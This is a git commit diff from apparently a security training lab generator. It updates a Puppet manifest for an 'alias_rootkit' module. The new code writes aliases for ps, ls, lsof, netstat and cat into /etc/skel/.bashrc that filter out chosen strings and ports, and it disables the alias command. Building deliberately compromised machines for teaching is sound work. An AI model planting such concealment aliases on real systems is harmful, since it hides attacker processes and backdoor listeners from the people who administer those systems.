624b4e63eb74c47b3e6111e6c1119d3846c88580
Z. Cliffe Schreuders <code.cliffe@schreuders.org>
2018-12-07 13:04:43 +0000

    lab updates

--- modules/utilities/unix/compromised/alias_rootkit/manifests/install.pp
+++ modules/utilities/unix/compromised/alias_rootkit/manifests/install.pp
@@ -1,9 +1,10 @@
 class alias_rootkit::install {
 
   $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
-  $hidden_port = $secgen_parameters['hidden_port'][0]
+  $hidden_ports = join($secgen_parameters['hidden_ports'], "\|")
+  $hidden_strings = join($secgen_parameters['hidden_strings'], "\|")
 
-  $aliases = "alias ps='f(){ ps \"$@\" |grep -v 'hme\|nc\|$hidden_port'; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v hme |column -c 80; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v '44\|hme\|nc\|$hidden_port'; unset -f f; }; f'; alias alias='true'"
+  $aliases = "alias ps='f(){ ps \"$@\" |grep -v \"$hidden_strings\"; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v \"$hidden_strings\" |column -c 80; unset -f f; }; f'; alias lsof='f(){ lsof \"$@\" |grep -v \"$hidden_strings\"; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v \"$hidden_strings\|$hidden_ports\"; unset -f f; }; f'; alias cat='f(){ cat \"$@\" |grep -v \"$hidden_strings\|alias\"; unset -f f; }; f'; alias alias='true'"
 
   file_line { 'Append a line to /etc/skel/.bashrc':
     path => '/etc/skel/.bashrc',
